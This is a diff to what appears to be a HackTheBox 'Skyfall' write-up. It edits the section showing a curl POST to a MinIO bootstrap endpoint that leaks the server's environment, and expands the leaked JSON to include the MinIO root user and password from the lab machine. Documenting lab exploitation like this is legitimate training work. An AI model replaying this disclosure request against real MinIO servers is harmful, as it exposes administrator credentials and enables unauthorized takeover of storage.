@@ -307,11 +307,23 @@ root@kali:~# curl -v -X POST http://prd23-s3-backend.skyfall.htb/minio/bootstrap
 * Connection #0 to host prd23-s3-backend.skyfall.htb left intact
 ```
 
-The `MINIO_ROOT_USER` and `MINIO_ROOT_PASSWORD` found:
+The `MINIO_ROOT_USER` and `MINIO_ROOT_PASSWORD` found under `MinioEnv`:
 
 ```json
 {
-  "MINIO_ROOT_USER":"5GrE1B2YGGyZzNHZaIww",
-  "MINIO_ROOT_PASSWORD":"GkpjkmiVmpFuL2d3oRx0"
+  "MinioEnv": {
+    "MINIO_ACCESS_KEY_FILE": "access_key",
+    "MINIO_BROWSER": "off",
+    "MINIO_CONFIG_ENV_FILE": "config.env",
+    "MINIO_KMS_SECRET_KEY_FILE": "kms_master_key",
+    "MINIO_PROMETHEUS_AUTH_TYPE": "public",
+    "MINIO_ROOT_PASSWORD": "GkpjkmiVmpFuL2d3oRx0",
+    "MINIO_ROOT_PASSWORD_FILE": "secret_key",
+    "MINIO_ROOT_USER": "5GrE1B2YGGyZzNHZaIww",
+    "MINIO_ROOT_USER_FILE": "access_key",
+    "MINIO_SECRET_KEY_FILE": "secret_key",
+    "MINIO_UPDATE": "off",
+    "MINIO_UPDATE_MINISIGN_PUBKEY": "RWTx5Zr1tiHQLwG9keckT0c45M3AGeHD6IvimQHpyRywVWGbP1aVSGav"
+  }
 }
 ```
